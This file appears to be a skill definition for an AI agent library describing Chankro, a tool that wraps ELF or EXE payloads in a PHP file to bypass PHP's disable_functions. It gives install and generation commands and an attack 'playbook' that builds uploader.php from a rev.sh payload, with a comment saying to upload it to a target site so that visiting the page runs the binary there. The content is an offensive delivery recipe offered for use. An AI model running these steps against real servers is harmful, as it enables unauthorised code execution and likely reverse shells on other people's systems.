---
name: chankro-php-binary
description: "Chankro: Delivers ELF/EXE payloads through PHP environments. Signals: payload development, weaponization, binary delivery via PHP, Windows payloads, specified PHP interpreter path."
zh-signals: "Chankro: PHP 环境投递 ELF/EXE。信号:载荷开发,武器化,生成二进制投递 PHP,Windows 载荷,指定 PHP 解释器路径。"
---

# Chankro

- 攻击大类:C07 载荷与文件投递
- 上游仓库:https://github.com/TarlogicSecurity/Chankro
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/TarlogicSecurity/Chankro && cd Chankro && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python chankro.py -a x64 -m linux -p /tmp/payload.sh -o chan.php` | 生成二进制投递 PHP |
| `-a x64 -m win -p payload.exe -o up.php` | Windows 载荷 |
| `-e /usr/bin/php` | 指定 PHP 解释器路径 |

## 攻击场景 Playbook

### PHP 环境投递 ELF/EXE

```bash
python chankro.py -a x64 -m linux -p rev.sh -o uploader.php
# 上传到目标站,访问即在目标上执行二进制
```

## 注意事项

Tarlogic 出品,绕过 disable_functions 把二进制载荷塞进 PHP 文件上传场景执行。
